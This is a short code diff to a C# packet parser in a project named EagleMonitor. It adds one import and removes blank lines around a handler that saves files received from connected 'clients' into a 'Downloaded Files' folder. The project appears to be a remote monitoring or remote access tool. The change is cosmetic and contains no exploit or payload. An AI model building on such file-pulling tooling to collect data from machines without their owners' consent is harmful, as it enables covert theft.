@@ -2,6 +2,7 @@
 using EagleMonitor.Utils;
 using PacketLib.Packet;
 using System.Threading;
+using System.Windows.Forms;
 
 /* 
 || AUTHOR Arsium ||
@@ -35,10 +36,8 @@ namespace EagleMonitor.PacketParser
                             System.IO.Directory.CreateDirectory(clientHandler.clientPath + "\\Downloaded Files");
                         System.IO.File.WriteAllBytes(clientHandler.clientPath + "\\Downloaded Files\\" + Miscellaneous.SplitPath(downloadFilePacket.fileName), downloadFilePacket.file);
                     }
-
                     downloadFilePacket.file = null;
                     downloadFilePacket = null;
-
                 }
                 catch { }
             }).Start();
